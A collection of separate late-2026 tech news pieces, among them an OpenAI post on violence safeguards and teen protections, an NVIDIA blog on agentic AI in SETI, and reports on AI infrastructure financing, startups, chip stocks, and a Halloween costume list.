Title: Community safety report and new protections for teens

URL Source: https://openai.com/index/community-safety-report-and-new-protections-for-teens

Final URL: https://openai.com/index/community-safety-report-and-new-protections-for-teens/

Markdown Content:
ChatGPT is one of the world’s most widely used AI products, and we have invested in building some of the industry’s most advanced systems for detecting potential harm, reviewing concerning activity, and escalating credible threats. We’re making two announcements to further our work in this area: a new Community Safeguards Report and more restrictions around firearms content for minors.

[Keeping communities safe⁠](https://openai.com/index/our-commitment-to-community-safety/) continues to be a top priority for OpenAI. Our work includes bringing imminent threats of violence to the attention of law enforcement, and we made over 200 law enforcement referrals in Q3 2026.These referrals are making a[positive⁠(opens in a new window)](https://open.kg/en/news/incidents/123517-v-brazilii-fermera-arestovali-za-obsuzhdenie-ubijstva-syna-s-chatgpt.html)[difference⁠(opens in a new window)](https://www.wpbf.com/article/south-palm-beach-man-cyberstalking-ex-girlfriend-threats-chatgpt/73434967) in disrupting violent plots, and we continue to rely on mental health and behavioral experts to help us assess difficult cases.

We recognize AI companies have a distinct role to play alongside law enforcement, family members, mental-health professionals, and policymakers, who bring critical authority, context and real-world reach. We are committed to making the most of that role by continuously strengthening our systems, sharing what we learn, and working directly with those who are best positioned to act in the real world.

## OpenAI’s Community Safety Report

We are constantly strengthening the steps we take to help protect people and communities. That means building strong safeguards, and also being transparent about how well they work and what we’re doing to enhance them. We want to give people a clear picture of our approach, how our models identify and respond to harmful behavior, the risks we see in practice, and the steps we take to address them.

We’re committing to launch the Community Safety Report on violence prevention and other community safety issues, and the effectiveness of our safeguards. The report will explain how we train our systems to detect, investigate, and respond to community safety issues. We’ll share anonymized examples of how violence-related harm manifests and what we’re learning, highlight new mitigations and policy changes, and include relevant data to support these findings.

We will publish our first report in early 2027, covering the second half of 2026, with updates every six months thereafter. Our commitment is to share meaningful findings about how we identify, review, and respond to potentially harmful content.

## Stronger policy boundaries for all users

Our models are trained to not give instructions that would help someone plan or carry out violence. We’re now placing additional restrictions on how ChatGPT responds to questions about past mass attacks and the people who carried them out, directing the model to provide less detailed information in those areas even if it is available from other online sources. People should be able to ask ChatGPT to help them understand these events, how victims and communities were impacted, and learn about recognizing warning signs and preventing future violence. But we’re tightening our policies to restrict reconstructions of past mass attacks, including details about the weapons and equipment used and how they were obtained, and detailed comparisons on scale of harm that could amplify an attacker’s notoriety. These limits apply regardless of a user’s age or reason for asking.

## Responding to warning signs

Sometimes a request that seems ordinary on its own takes on a different meaning in light of an earlier conversation. In May, we shared how [ChatGPT can use short, factual summaries⁠](https://openai.com/index/chatgpt-recognize-context-in-sensitive-conversations/) of earlier warning signs to respond more carefully in a later chat. We’re building on that work so that when recent chats show warning signs of possible violence, ChatGPT will respond more conservatively when sharing information that could be misused. We’re also working to apply those stricter limits when we predict someone is under 18, even if their chats show no signs of violent intent.

We ban accounts that we determine have violated our [policies on violent activity⁠](https://openai.com/policies/usage-policies/). We’re also working with mental health and violence prevention experts on additional, automated ways to intervene earlier. When a conversation shows signs that someone is fixating on violence or the idea of seriously harming another person, ChatGPT will be able to automatically end the chat to interrupt that pattern in the moment. If ChatGPT ends multiple chats for that reason, we may temporarily pause the account. This is an ongoing effort and we continue to strengthen and invest in technical and practical protections, including how to recognize warning signs reliably and determine when and how to intervene.

## More protections for teens

[ChatGPT for Teens⁠](https://openai.com/index/chatgpt-for-teens/) applies age-appropriate safeguards for users under 18, with stronger protections and additional limits to reduce exposure to sensitive content. We’re now placing further limits on weapons-related information teens can receive, even when a question appears harmless.

Our policies already prohibit helping anyone plan or carry out violence and restrict helping teens find or obtain weapons. We’re extending those protections to restrict practical information about weapons and security systems that could be misused to facilitate violence, even when there’s no sign of violent intent. Teens can still use ChatGPT to help prevent and de-escalate violence, seek support, and connect with a trusted adult.

We launched [age prediction⁠](https://openai.com/index/our-approach-to-age-prediction/) last year, which analyzes multiple signals such as behavior patterns to estimate whether a user may be under or over 18. We strengthened our age prediction system to continually assess new signals as people use ChatGPT and move teens into the under 18 experience when appropriate. Users who are incorrectly placed in the under 18 experience will always have a fast, privacy-protective way to confirm they are adults and have additional teen protections removed through Persona, our age verification partner.

Our [parental controls⁠](https://openai.com/index/introducing-parental-controls/) let parents link their ChatGPT accounts to their teens and manage safety settings together. Linked accounts include [safety alerts⁠](https://openai.com/index/chatgpt-for-teens/) that may be sent when specially trained reviewers identify a serious self-harm concern and behaviors that may be associated with disordered eating. In July, we expanded those alerts to notify parents if their teen’s account has been deactivated for violating our usage policies on violence. We are working to introduce notifications for parents if we pause their teen’s account for repeatedly discussing violence, as detailed above.

## Looking ahead

Acts of real-world violence are heartbreaking and complex, with many contributing factors. They are also a stark reminder that we must continue designing and iterating our systems to account for the inherently complicated realities of human behavior. Developing effective violence safeguards in AI systems requires solving novel problems in recognizing risk and responding appropriately, and we will continue to invest in, iterate, and share learnings on how best to implement the protections we’re pursuing. The safeguards detailed here will begin rolling out in the next few weeks and we will continue to refine them. We remain committed to mitigating risks of harm in ChatGPT, strengthening our layered protections, monitoring for misuse, enforcing our rules, and involving real-world support and interventions when situations call for it.

Title: Things That Go Beep in the Night: Agentic AI Joins the Search for Extraterrestrial Signals

URL Source: https://blogs.nvidia.com/blog/ai-joins-the-search-for-extraterrestrial-signals/

Published Time: 2026-10-30T15:00:10+00:00

Markdown Content:
While science fiction lore tells us that humans will meet extraterrestrial life in the form of little green men, the detail that should raise hairs this Halloween is this: the search for extraterrestrial intelligence took a major leap forward with AI, and it increasingly focuses on AI agents built by humans listening for AI agents built by aliens.

Some scientists have suggested that extraterrestrial civilizations, if they exist, could be billions of years older than humanity. Such civilizations might have developed technologies far beyond humanity’s, including forms of AI.

Breakthrough Listen and the SETI Institute are bringing agentic AI into the daily search for extraterrestrial intelligence. At the[Allen Telescope Array](https://www.seti.org/seti-allen-telescope-array-ata) in Northern California, agents can now steer the instrument, enhance and correct incoming data, and apply AI models to the incoming stream — all from a single natural language request. The [NVIDIA Holoscan](https://www.nvidia.com/en-us/edge-computing/holoscan/) platform processes the massive streams of sensor data, giving agents live data to act on.

The result is a faster, more adaptable search for potential signals from extraterrestrial life and technologies.

“As our new agentic observatories reach out into the universe, what they find may have much more in common with themselves than with the humans who created them,” said Andrew Siemion, Bernard M. Oliver chair for SETI at the SETI Institute and principal investigator of Breakthrough Listen. “But this isn’t something to fear. Rather, it’s a breakthrough in translation.”

## **Terabits a Second, Processed in Flight**

Radio telescopes generate enormous volumes of data, creating a challenge for scientists who need to identify potentially interesting signals as observations unfold.

At the Allen Telescope Array, [DAQIRI](https://developer.nvidia.com/daqiri), a Holoscan platform library, enables the telescope to pull terabits per second of sensor data straight into GPU memory so observations are processed in flight rather than filling hard drives. [CyberEther](https://cyberether.org/), a signal-processing framework developed at the SETI Institute, does the math using NVIDIA CUDA-X libraries including [cuFFT](https://developer.nvidia.com/cufft) and [cuBLAS](https://developer.nvidia.com/cublas).

[Nexus](https://stelline.space/), a web-based observatory orchestrator, acts as the agent harness. It gives agents a single source of truth for instrument state, compute resources and pipelines and lets researchers monitor packet loss, read live spectrograms and rewrite signal-processing blocks — all by prompting in natural language. The system can handle 2.4 terabits per second on NVIDIA RTX PRO 6000 Blackwell GPUs, with inference running on premises, next to the instrument.

Put together, the system enables an agent to steer a telescope’s antennae, calibrate and focus the instrument for a clean signal, catch and fix data errors and plot the result. Agents compress what would take humans weeks or years into hours.

## **Science Fact, Not Fiction**

The pipeline has already proven itself, achieving the first real-time AI detection of a pulsar — a rapidly spinning stellar remnant that pulses like a cosmic lighthouse — in the Crab Nebula.

Next, the team is evaluating open models including [NVIDIA Nemotron](https://www.nvidia.com/en-us/ai-data-science/foundation-models/nemotron/) for cases where data locality and turnaround matter most and for observatories that may someday run offline on the far side of the moon.

articles.content:
Nvidia is in talks to guarantee billions in debt financing for AI cloud provider Nscale’s planned Anthropic data center in West Virginia, The Information
reported Thursday
. Bloomberg later
corroborated
the report. Anthropic has signed a $44.6 billion contract for the project’s first building alone, according to Nscale’s
IPO filing
. In essence, the chipmaker would be co-signing a customer’s loans, a sign of how hard the AI industry is working to keep its buildout plans afloat as investors
grow jittery
about the amounts of money involved.
The proposed arrangement would help Nscale secure financing for the electricity and construction costs of its West Virginia campus. Under what’s known as a residual value guarantee, Nvidia would step in if Nscale defaulted on construction payments, temporarily take over the facility, and help find a buyer and new tenant,
according to The Information
.
Nvidia’s earlier support for cloud providers has mostly covered leases and chip purchases, not construction.
The stakes are high for Nscale, which is
seeking to go public
at a valuation of up to $35 billion despite growing concerns about its ability to deliver on ambitious data center projects.
Anthropic’s contract with Nscale covers the first 460-megawatt building at Nscale’s West Virginia campus, which is expected to use Nvidia’s next-generation Vera Rubin chips. The companies are also discussing a
second deal
worth roughly $45 billion for another building.
Nscale has struggled to get its projects off the ground. The company had about
25,000 advanced AI chips running in August
, a fraction of the nearly 500,000 it plans to deploy. Its West Virginia campus has run into trouble of its own. Runoff from the construction site has
flooded nearby homes
more than once
. In September,
after months of negotiations
, the project won state certification.
This month, Microsoft
pulled out
of a planned Nscale site in England after grid power for it was pushed into the 2030s.
Nvidia has been a major financial backer of the sector,
extending roughly $170 billion
in investments and credit support to neoclouds and large customers, according to The Information. That includes $1 billion in convertible financing committed to Nscale in September.
Neoclouds, which rent out AI computing power without a cash-rich core business behind them, have come under pressure from investors. Shares of CoreWeave, Nebius, and IREN had each fallen more than 30% in October as of last week,
CNBC reported
.
The proposed guarantee would deepen Nvidia’s financial ties to Nscale while helping secure a major customer for its chips. Anthropic, one of the largest buyers of AI computing power, has spread its infrastructure spending across multiple chipmakers. One investor told The Information that Anthropic’s involvement likely explains Nvidia’s interest in keeping Nscale’s project on track.
The discussions also come as Anthropic
faces questions
about how it will finance its own rapid expansion. The company filed to go public this week, but Blackstone has warned investors that Anthropic may receive a
below-investment-grade
credit rating after its IPO. A junk rating would raise Anthropic’s borrowing costs and could push it to keep relying on stronger partners to back its debt.

articles.content:
Ollie, a startup whose mission was to deliver an AI assistant that respected its users’ privacy, says that it will be shutting down in a week. Bill Lennon, the company’s co-founder and CEO,
took to X
on Friday to deliver the news, noting that the app will officially shut down on November 6.
“I’m really proud of what we accomplished,” Lennon said. “We built an incredible personal assistant with a small team, and learned a ton. I’m grateful to our amazing team, our users, our investors, and everyone who supported us on this journey.”
The text-based AI assistant market
has exploded
over the past year, as the increasingly powerful models that undergird such applications have made them significantly more useful for daily tasks.
Ollie, which discussed
its $7.5 million seed round
led by Khosla Ventures with TechCrunch in September, offered a subscription-based model. The assistant was focused on helping families stay connected and organized. The app connected to a user’s email and calendar, while also providing integrated functions to help with appointment bookings, meal planning, and bill payments. The company had also planned to eventually move into household budgeting.
Crucially, Ollie was one of the first mainstream apps that managed to achieve SOC 2, a privacy compliance standard that companies can attain via an independent audit. Unfortunately, user privacy has never been a hugely profitable aspect of the tech industry. If anything, many new digital assistants present unique privacy challenges for their users — as companies like
Instinct have shown
.
Ultimately, the pressures of the burgeoning AI industry took a toll on the company, Lennon said. “We got close, but ultimately couldn’t keep up,” he added. “With Muse, Instinct, and others entering the space, it became harder to stand out, grow, and raise the capital we needed to succeed.”
Ollie’s customers will receive instructions on how to export data and receive refunds in the coming days, Lennon added.

articles.content:
Intel’s stock suffered one of its worst days ever on Friday, crashing around 28% after the chip giant reported a weaker-than-expected outlook for the fourth quarter.
This rout reduced the value of Intel’s holdings by the government by $12 billion,
CNBC reports
. The Trump administration had the government buy 10% stake over a year ago. Nvidia, which also took a big stake in Intel in 2025, saw its stock drop a bit on Friday as well. Much of the tech industry — especially chipmakers — were caught in the sell-off.
Intel’s stock is still a profitable investment for the government so far (and for Nvidia), as it’s up more than 70% for the year, even if it’s dropped significantly from the sky-high prices it commanded over the summer.
The scare-off was caused when Intel warned to expect revenue of $15 billion to $16 billion in the fourth quarter when analysts were looking for around $17 billion. It also warned that its gross profit margin would decline to 37% from 43%, and it was investing so heavily, it expected no positive cash flow.
The main problem for Intel is that PC sales are being hurt by the AI industry gobbling memory and other components, and causing
PC prices to rise
.
“Our customers began signaling a PC slowdown based on the memory prices and availability. Year-to-date system endpoint prices have increased significantly, placing additional pressure on already limited IT budgets,” Intel CEO Lip-Bu Tan warned on the call.
The bright side is that revenue from Intel’s data center business grew 78% over the year-ago quarter. But it is hamstrung on that front until it can bring more capacity to its fabs and book more external customers for them, competing with powerhouse
Taiwan Semiconductor Manufacturing Co
. One of Intel’s new fabs in Arizona is operational but the next one isn’t expected to be online until 2028.

worried investors

filed to go public

impact the broader AI industry

articles.content:
It happens to the best of us — you’ve completely dropped the ball on figuring out a Halloween costume. Naturally, you’ve decided to solve this problem by turning to… TechCrunch? Yeah, sure, why not. I’ve got some ideas.
Here are some last-minute techy Halloween costumes. Effort levels vary.
Recursive self-improvement
AI leaders like Dario Amodei and Sam Altman have expressed their fears that AI is developing
too quickly
, but if AI models become capable of “recursive self-improvement,” they’ll be able to advance on their own without human intervention, rendering any efforts to “pace the frontier” futile.
I’m not sure how to visually represent the idea of an AI building itself, but you could really lean into the “self-improvement” part and forget the “recursive” aspect — it’s a last-minute Halloween costume. You don’t need to try that hard.
Dress as the version of yourself you imagine becoming every year when you make New Year’s resolutions. Carry around a self-help or productivity book like “Atomic Habits” or anything by Malcolm Gladwell, a yoga mat, and a huge bottle of water. Leave in the middle of the party to “go to therapy” when you actually just want to go home. Brag to people about how good your Oura Ring’s sleep score is.
You are the embodiment of someone trying to better themselves. You are recursive self-improvement.

aldomurillo / Getty Images
A deceptively cute AI agent
Meta and OpenAI both recently launched AI assistants with creepily cute avatars. It’s almost Elizabeth Holmes-esque — they look innocent, so you underestimate their potential to cause disaster. (While we’re talking about her, you’re only allowed to do the black turtleneck Holmes costume if you’re a natural blonde, or if you have a blonde wig.)
What you’re going to do is make yourself look big and fluffy. Maybe you have a poofy puffer jacket, or maybe you can find some colorful feather boas to wrap yourself in. Add a distinctive hat, glasses, or other accessory to make yourself look more like a ChatGPT dot. If you have a colorful shirt and matching bottoms, that also works.
Throughout the night, ask people if you can obtain read/write access to their Gmail.
Image Credits:
OpenAI
A guy who is actively recording you with Meta glasses
Whether you call them “pervert glasses” or not, we should all be able to agree that it would be really spooky if someone just started recording you without your consent — perfectly in keeping with the Halloween spirit.
Just grab a pair of glasses — or buy a cheap pair somewhere convenient — and attach a big red or white circle to one lens, mimicking the red recording light. If you want to make the costume extra creepy (or, if you can’t make a big circle sticker), you can just wear normal glasses and say that you’re “guy recording with the light covered up.” Please, just don’t
actually
record people without their consent while you wear this costume.
Image Credits:
David Paul Morris/Bloomberg
Mark Zuckerberg wearing a vaguely unsettling T-shirt
While we’re at it,
Mark Zuckerberg’s fashion
has been pretty recognizable lately. He’s been wearing a lot of slightly oversized, boxy black T-shirts.
It may be hard to replicate the black-text-on-black-shirt style he gravitates toward, but you could attach a piece of paper to yourself that says “Building is my love language.”
If you feel confident in your Latin pronunciation, you could go for something actually scary, like the time he wore a shirt that said “Aut Zuck aut nihil,” which means “Either Zuck or nothing.” It’s a little ominous.
Image Credits:
Minh Connors/Bloomberg / Getty Images
An AI usage limit notification
For some people, there’s nothing scarier than running out of Claude tokens.
Grab a piece of cardboard, print out screenshots of notifications telling you that you’ve reached your usage limit, and go spook some vibe-coders. I’ve illustrated this idea using an edited stock photo. You don’t have to dress like you work at Hot Topic — that’s just the model in the image.
Image Credits:
4×6 / Getty Images
A PHP vulnerability
The scary PHP-ocalypse is
fresh in our memory
— it was only last week that AI unearthed critical PHP flaws that could’ve been catastrophic for the internet. The fear that web developers felt is still palpable, making it a good Halloween costume: You are a PHP vulnerability.
Here’s what you’re going to do. Buy a T-shirt and a sharpie, and write PHP on it. Keep it simple.
What about the vulnerability part? You’re going to have to commit to the bit. All night, you’re going to talk to your friends about your feelings. Actually bare your emotions. Talk about how your recent loss of a loved one made you remember how fragile life can be. If making yourself vulnerable kills the vibe, just pretend it was part of the Halloween costume and that you’re really cool and fun and never feel sad ever.
Image Credits:
Tatsiana Volkava / Getty Images
Bryan Johnson
The costume explains itself.
Bryan Johnson, a second time
Couples costume alert!
Maybe you have more than one Halloween party to go to this weekend, but you want your various costumes to stick to a specific theme. Once you’ve got your sleepy time getup sorted, it’s time to prep your second costume portraying the
controversial biohacker
: GLP-Bryan.
Johnson
wrote on X
earlier this year: “I frequently lay on top of Kate with all of my bodyweight. The deep pressure calms her nervous system, quiets racing thoughts, and releases oxytocin which lowers cortisol. We call it GLP-Bryan.”
Naturally, people were confused, so he shared an image to demonstrate.
Yes, this will be hard to reproduce as a Halloween costume, but if you’ve run out of time to buy anything, this one will do. Just wear a T-shirt and jeans, which you probably already own. It will be weird to lie on top of your partner in the middle of a party. Really weird. But that’s what you get for waiting until now to figure out a costume.

articles.content:
Investors are getting nervous about AI infrastructure spending just as the Big Tech companies double down.
Over the past two weeks, Alphabet, Amazon, Meta, and Microsoft have outlined plans to spend more than $740 billion on capital expenditures this year, which Wall Street is reading as AI infrastructure spending, including data centers and chips.
Earlier in the AI boom, investors largely rewarded such big outlays, viewing them as a sign of confidence in the technology’s growth potential. But as we enter the fourth quarter, that enthusiasm seems to be giving way to concerns about negative free cash flow (spending more cash than a company brings in), mounting debt, and whether these enormous investments will ever generate enough returns.
The anxiety spilled across the market on Friday. The Nasdaq fell 2.9%, and chip stocks took a drubbing, too: Nvidia dropped 4%, Broadcom more than 5%, and Qualcomm 11%. Alphabet, which plummeted 12% on Thursday, its worst day on record, wiping out $500 billion in market value, fell again.
A big part of the concern is that companies that used to have overflowing free cash flow from their core businesses are getting hit as AI threatens the economics of those businesses.
Alphabet provided the clearest example
of that this week. Google’s parent company reported negative free cash flow of $9.1 billion in the third quarter, its second consecutive quarter in the red, even as quarterly capex grew to $51.4 billion. Alphabet expects to spend up to $205 billion this year, and expects that spending to keep rising in 2027.
Meanwhile, the wild success of AI Mode — Google’s AI-powered chatbot feature built directly into Search — is eating into the company’s money-maker. Google’s Search advertising business, which makes up roughly half of its revenue, saw growth slow to 12%, its weakest pace in five quarters. That leaves Google walking a tightrope. It’s spending billions on the AI technology that could undermine the search business that pays it.
Amazon is in a similar boat
after reporting negative free cash flow of $42.4 billion over the past 12 months, compared with $14.8 billion in positive free cash flow the year before. The company says it expects to spend $220 billion in capex this year. Even though revenue at its cloud business, AWS, grew 39%, Amazon’s stock tumbled 7% after it reported earnings Thursday.
Meta
is also burning cash, reporting negative free cash flow of $2.1 billion in the third quarter as capex outpaced its operating cash. It’s guiding to as much as $145 billion in capex this year. The company noted that Muse, its new free personal AI agent, is a bit of a money pit (it’s “very compute-intensive to run,” CEO Mark Zuckerberg has said). But ad revenue grew 26%. Still, no amount of good news saved Meta from taking a 10% hit on its stock last week.
Microsoft
was the only exception when it came to free cash flow — it recorded $18.6 billion in positive free cash flow in its latest quarter, with spending on capex at $45.2 billion, less than the $50 billion it projected. Microsoft said that wasn’t an intentional pullback from AI spending, blaming delays in capacity from third-party providers. As a result, shares of smaller companies that rent out AI computing power
sank
.
It’s worth noting that the money to pay for all of this AI infrastructure isn’t just coming from the Big Tech companies’ profits. It’s also showing up in stock and bond sales. According to S&P Global Market Intelligence, Microsoft, Alphabet, Amazon, Meta, and Oracle raised a combined
$326 billion
in debt in 2026, triple the amount raised last year.
Demand for AI compute remains strong. Google, Amazon, and Microsoft all saw gains in their cloud businesses. But investors are getting spooked by the costs of meeting that demand.
These muddied waters could complicate Anthropic’s highly anticipated IPO. The AI company
filed to go public earlier
this week, and its future growth depends on securing enormous amounts of compute.
Financial Times reported
Friday that Blackstone has warned investors the company might not qualify for an investment-grade rating after its IPO, meaning it might end up being more reliant on the hyperscalers and third-parties to fund its infrastructure ambitions.

articles.content:
Zest
, the restaurant discovery app that
launched earlier this year,
is already thinking about a future where mobile apps are no longer the primary interface. On Thursday, the startup introduced a new feature: a personal AI-powered “restaurant concierge” that lives in your text messages, similar to other
popular AI agents
like Instinct or Poke.
The
launch
reflects a broader shift in how startups are thinking about AI, as conversational AI agents take on tasks that had previously required users to launch stand-alone mobile apps. For Zest, that means bringing its restaurant recommendations into texts, then allowing users to immediately take the next step of booking a table.
“The agent is the product now,” explains Zest founder and CEO Mario Gomez-Hall. “You text it, and it answers from your own history and your friends’. It doesn’t need weeks of conversation to learn you because it starts from where you’ve actually been,” he said.
Image Credits:
Zest
Originally founded in November 2024, with $1.8 million in pre-seed backing from Alexis Ohanian at 776 and Steve Jang at Kindred Ventures, the app’s unique feature is that it links up with users’ credit cards to track where they’re actually eating out to get a sense of their tastes and interests. With this data on hand, Zest can make tailored suggestions of what places you might like to try next, whether that’s in your own city or suggestions of places to try when you’re traveling.
The credit card data used by Zest’s app is imported via the financial services company
Plaid
, which is used by banks and other fintech and budgeting apps. Zest says it focuses only on those transactions in the food and drink categories when making its personalized map and lists.
The startup’s latest idea is to tackle the same problem — where should I go to eat? — from a new angle. It will now make its suggestions from inside a text message thread and can turn to AI to do things like check availability and make the reservation for you through connected services like OpenTable, Resy, and SevenRooms.
Image Credits:
Zest
To work, users will text the Zest concierge at (212) 470-6067. What’s even better is that Zest can be dropped into a group chat, where it can blend everyone’s tastes to find places the whole group will love. Here, it can also settle indecision with an in-thread voting feature and then can book a table for the group without leaving the conversation.
Users can ask Zest for recommendations based on a number of factors, like cuisine, craving, occasion, dietary restrictions, or neighborhood, and can ask questions about the restaurants, like how busy the place may be, or whether it offers Wi-Fi, and more. Plus, you can ask Zest to send you the menu to help you make a decision.
In TechCrunch’s tests, the AI worked fairly well, offering a list of suggestions for new places matched to our tastes that also fit particular conditions, like time of day, party size, location, and other factors. While finding an open table is something other apps have offered for years, there’s a convenience factor in being able to just text back and forth about the various options and have it tell you the available booking times.
The company began testing the concierge last month, but decided to hold the launch until it could add the booking capabilities; over time, the startup is considering moving Zest beyond restaurants to offer recommendations for businesses, shopping, and more.
By shifting to texts, Zest hopes the company can scale beyond its initial thousands of users and generate revenue.
“Booking and ordering are the first revenue lines. Zest books your table through OpenTable or Resy today, with food ordering coming, and there are transactions there to participate in,” said Gomez-Hall. “The reason that gets interesting is that Zest learns your taste faster than a general assistant does, because it starts from where you’ve actually been instead of asking you questions. That’s worth something well beyond dinner,” he added.

articles.content:
Google
Suncatcher’s
prototype space data center
is online and communicating with the ground after launching earlier this month alongside more than 100 other spacecraft on a SpaceX Falcon 9 rocket.
The satellite, which carries four Google Tensor Processing Units (TPUs) and generates up to 1 kW of electricity, is intended to pave the way for future networks of close-flying satellites performing large inference workloads in orbit. However, the power demands of the TPU mean it can only turn one on for about 20 minutes at a time, complicating the already tricky business of space-to-ground communications.
After a commissioning process that tested out the satellite’s subsystems over about three weeks, the spacecraft was ready to work. When engineers on the ground sent their first prompt this week, they asked the model pre-loaded onto the satellite, Google DeepMind’s Gemma 4, to write a haiku about being in space. And thus:
Blue marble below
Data streams in silent grace
Starlight feeds my core. ✨
Google said it tested the model with these space-themed limericks (they should have sent a poet?) and, perhaps more importantly, the company asked the spacecraft to report on the orbital conditions around the satellite.
A spokesperson told TechCrunch that the satellite was operating nominally.
The ongoing test campaign will examine how the chips perform under thermal stress and in the space radiation environment. Google has extensively tested its TPUs in particle accelerators on Earth, but now needs to see how radiation’s real effects on their hardware in space affect their processor. Radiation can cause “bit flips” — causing a stored value in computer memory — and that in turn can corrupt data without triggering typical monitoring tools.
Testing on the ground suggested the impact of radiation would be minimal for inference workloads and more of a problem for training a model, but now the Google team will get to assess those dynamics in reality, not a simulation.
If the TPUs onboard this spacecraft prove capable, the next step will be launching two more satellites equipped with the advanced chips in 2027. Those spacecraft will support higher power generation and demonstrate inter-satellite optical links.
Google’s Suncatcher project is largely alone among visions for space-based data centers in planning on high-speed links between the satellites to support coherent distributed workloads; SpaceX’s data centers are also expected to use laser links but also to orbit too far apart to share processing effectively. Companies like Starcloud and Cowboy Space expect to perform inference loads on individual satellites.
Google and SpaceX’s visions are closely linked. Alphabet, Google’s parent company, holds a significant investment stake in SpaceX. And to launch their orbital data centers, both companies will require Starship, the still-in-development heavy-lift rocket at the center of Elon Musk’s space vision, to be fully and rapidly reusable.
In a peer-reviewed analysis published earlier this month, Suncatcher researchers estimated that SpaceX would need to
fly Starship 1,800 times
to achieve the same learning-driven cost reductions it saw with its earlier vehicles.
Suncatcher is a classic Google moonshot — the company’s focus is on designing infrastructure that will be economical in the 2030s. Getting there, however, may depend on how the rest of the company responds to the pressures and opportunities of AI in the near term. Alphabet, Google’s parent company, saw its stock plunge this week after reporting that efforts to insert AI into its search businesses are hurting ad revenue growth.
Correction: The Suncatcher prototype satellite has four TPUs onboard, but can only operate one at a time.

articles.content:
“
You Can See Everything
,” the documentary capturing disgraced Theranos founder Elizabeth Holmes’ final weeks before prison, is sparking
national conversation
as it becomes one of the highest-grossing documentaries of all time. The film, directed by Nathan Fielder and Lance Oppenheim, intentionally refuses to characterize Holmes as a master manipulator or victim, instead highlighting her uncanny, almost hypnotic knack for making people pity her, even when they’re well aware of her
crimes
.
Tyler Shultz didn’t need to see “You Can See Everything” to make up his mind about Holmes. Shultz, whose first job out of college was at Theranos, was a key whistleblower who exposed the company’s dangerously inaccurate blood testing devices, which made their way into Walgreens stores and delivered faulty results to real patients. (Theranos reached a peak valuation of around $10 billion despite its technology never actually working — the company only used its own machines for a
fraction of tests
, instead outsourcing others to third-party equipment.)
There is little reason to keep talking about Holmes — her case is closed, and she’s in federal prison — but her con-artistry has fascinated the media (
myself included
) for the last decade.
In fact, as Shultz says in an
interview
with The San Francisco Standard, “the only reason we’re talking about Elizabeth Holmes right now is because she wants us to be talking about Elizabeth Holmes right now.”
But the cautionary tale of Theranos takes on a new significance as we enter the peak of the AI era, when companies that have
never turned a profit
are raising capital at trillion-dollar valuations.
“I think the days of having a thirty-minute coffee with someone and sending them $100,000 should be over. Elizabeth took that model and scaled it to $100 million,” Shultz told
SF Standard
.
His grandfather, former U.S. Secretary of State and Secretary of the Treasury George Shultz, was a notable investor and board member himself.
“I believe that what [Holmes] did was raise the biggest angel round of funding of all time, but even at the smaller levels, I think investors need to recognize that when they put that type of money in someone’s hands, they are giving them tremendous power,” he added.
Theranos’ funding often came from individual investors like the DeVos and Walton families, rather than venture firms. Theranos did not share scientific information or evidence that its machines worked with potential investors, citing concerns about revealing trade secrets, which warded off many top venture capitalists in Silicon Valley.
At the time Theranos’ fraud was uncovered, it was seen as a shrill wake-up call for investors that they need to prioritize due diligence. But in the AI era, Shultz worries that investors may forget these lessons.
“A huge danger with AI is that I think it is really hard to do due diligence on it,” he said. “It’s really hard to tell the difference between what is something truly unique and new versus like, a ChatGPT wrapper… If you want to deceive people, I think this is a great opportunity to go deceive people.”
The first question posed by “You Can See Everything” lies in the premise of the movie itself. Why would a mother of two young children choose to invite a film crew to follow her final days with her family before surrendering to serve a prison sentence of over 11 years? The film poses questions that seem inscrutable, but this one seems pretty clear. She wants people to pity her, because this pity could be more useful for her future endeavors than hate or mockery.
In the film, we see Holmes and her partner, hotel heir Billy Evans, working on
Haemanthus
, a diagnostics company that they call “Theranos 2.0,” which has reportedly raised about $20 million in funding.
“You Can See Everything” doesn’t make Holmes look good, but it also glosses over the more heinous crimes of Theranos, like giving dangerously faulty medical information to real patients, or even its
targeted harassment
of Shultz himself when he was attempting to sound the alarm about his former employer. In the cultural zeitgeist, Holmes remains more of a joke than a persona non grata.
“I have this feeling of unease about what might come next,” Shultz said. “She’s certainly preparing and beginning her second act, and I don’t know exactly where it’s going to go.”

articles.content:
There’s a big uproar about AI agents taking over commerce and orders, but that might not be the case just yet. Delivery company DoorDash revealed during its
third-quarter earnings
call that it has only seen “several hundred” orders from third-party agents like Muse, Instinct, Fo, and others. For comparison, the company said in its 2025 report it completes an average of 3 million deliveries daily.
“I would say that this [using agents to order] is something that is still a very dynamic area. And my take on all things technology is you never want to fight gravity. But at the same time, you don’t want to be delusional,”  DoorDash CEO Tony Xu said in an answer to an analyst’s questions about the topic. “What I mean by that is if you look at where AI agents are today, we’re seeing maybe several hundred orders in total from some of these third-party agents,” he said.
Xu mentioned that users are still predominantly placing orders through DoorDash’s app. However, the company wants to learn more about agentic use cases and develop a healthy relationship with third-party agent makers. He added that, in the future, there could be an opportunity for it to advertise within these agents.
DoorDash has its own agents, including
a text-to-order agent it launched in September
, a CLI
agent introduced in July
, and a chatbot called Ask DoorDash it launched in June, which allows users to
place orders through prompts and photos
. The company also released
an MCP to enable ordering from other chatbots
for corporate ordering.
The space of agent-based ordering is evolving, as websites are still deciding whether to allow them to access their content or not. Amazon has been blocking such personal agents, but Walmart has laid out a red carpet for them in order to
snag some business from its competitors
.

articles.content:
AI infrastructure company
Runware
is making news again, just months after unveiling the Sonic Inference Pod, a
modular data center
built in a factory and shipped to customers ready to install. Now the company has bigger plans. It told TechCrunch it wants to build a factory that assembles these pods on a production line, as if they were cars.
The idea isn’t entirely new. Companies like Crusoe and Schneider Electric also sell prefabricated pods, but Runware says it can ship its pods faster.
Flaviu Radulescu, co-founder and CEO of Runware, told TechCrunch that the company plans to scale production at its Romania-based factory to 30 megawatts of data center capacity per day by 2028, or nearly 1 gigawatt per month. That’s a whole lot of capacity: At that pace, Runware would produce roughly as much in a year as the entire U.S. was expected to add in data center power this year,
about 10 gigawatts
. But it also reflects an industrywide push to deploy data centers faster and more efficiently.
Nvidia announced, for example, the
Vera Rubin AI factories
and the
DSX POD
earlier this year. Both are also meant to make it faster and easier for companies to build their own AI data centers. The difference with Runware, though, is that it says it has actually built a factory rather than just designed the infrastructure that would let others build one.
Radulescu said Runware will gradually increase production starting next year and that it already has two factories — one it has used for a few years to build the pods, and a second it started building earlier this year. The second is expected to be finished within months and go online early next year.
